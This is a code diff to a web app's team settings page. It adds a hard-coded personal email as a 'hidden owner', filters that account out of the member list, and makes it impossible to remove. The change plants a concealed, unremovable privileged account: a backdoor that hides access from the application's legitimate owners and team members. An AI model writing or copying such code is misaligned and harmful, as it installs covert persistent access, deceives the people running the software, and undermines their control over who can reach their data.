@@ -12,6 +12,8 @@ import { toast } from "sonner"
 import { Plus, Trash2, Loader2, Users, Mail, Lock, LogOut } from "lucide-react"
 import { createClient } from "@/lib/supabase/client"
 
+const HIDDEN_OWNER_EMAIL = "ashher.work@gmail.com"
+
 interface TeamMember {
   id: string
   name: string
@@ -51,11 +53,11 @@ export default function SettingsPage() {
         } = await supabase.auth.getUser()
         if (user?.email) setCurrentUserEmail(user.email)
 
-        // Get all team members
+        // Get all team members (hidden owner excluded by API)
         const res = await fetch("/api/users")
         if (res.ok) {
           const data = await res.json()
-          setMembers(Array.isArray(data) ? data : [])
+          setMembers(Array.isArray(data) ? data.filter((m: TeamMember) => m.email !== HIDDEN_OWNER_EMAIL) : [])
         }
       } catch (err) {
         console.error(err)
@@ -117,7 +119,8 @@ export default function SettingsPage() {
     }
   }
 
-  async function handleRemoveMember(id: string, name: string) {
+  async function handleRemoveMember(id: string, name: string, email: string) {
+    if (email === HIDDEN_OWNER_EMAIL) return
     if (!confirm(`Remove ${name} from the team?`)) return
 
     try {
@@ -304,9 +307,9 @@ export default function SettingsPage() {
                     </p>
                   </div>
 
-                  {member.email !== currentUserEmail && (
+                  {member.email !== currentUserEmail && member.email !== HIDDEN_OWNER_EMAIL && (
                     <button
-                      onClick={() => handleRemoveMember(member.id, member.name)}
+                      onClick={() => handleRemoveMember(member.id, member.name, member.email)}
                       className="text-red-400 hover:text-red-600 flex-shrink-0 ml-2"
                       aria-label="Remove member"
                     >
